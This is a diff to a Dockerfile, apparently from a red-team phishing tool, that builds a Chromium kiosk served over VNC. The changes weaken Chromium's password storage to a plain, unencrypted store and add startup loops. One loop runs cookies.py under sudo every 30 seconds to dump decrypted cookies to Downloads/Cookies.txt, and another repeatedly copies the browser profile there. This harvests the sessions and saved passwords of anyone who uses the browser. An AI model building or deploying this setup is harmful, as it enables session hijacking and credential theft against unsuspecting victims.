@@ -5,9 +5,9 @@ LABEL maintainer="JoelGMSec - https://darkbyte.net"
 ENV DISPLAY :0
 ENV RESOLUTION 1920x1080x24
 
-RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 git openssl curl && \
+RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev && \
     ln -s /usr/bin/python3 /usr/bin/python && \
-    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox"' >> /etc/chromium/chromium.conf && \
+    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic"' >> /etc/chromium/chromium.conf && \
     dbus-uuidgen > /var/lib/dbus/machine-id
 
 RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
@@ -34,7 +34,8 @@ RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
     chmod +x /home/user/kiosk.sh
 
 RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
+    echo 'nohup /bin/bash -c "sudo pip3 install pycryptodome" &' >> /home/user/startVNC.sh && \
+    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
     echo 'nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
     echo 'sudo rm -f /tmp/.X${DISPLAY#:}-lock' >> /home/user/startVNC.sh && \
     echo 'nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &' >> /home/user/startVNC.sh && \
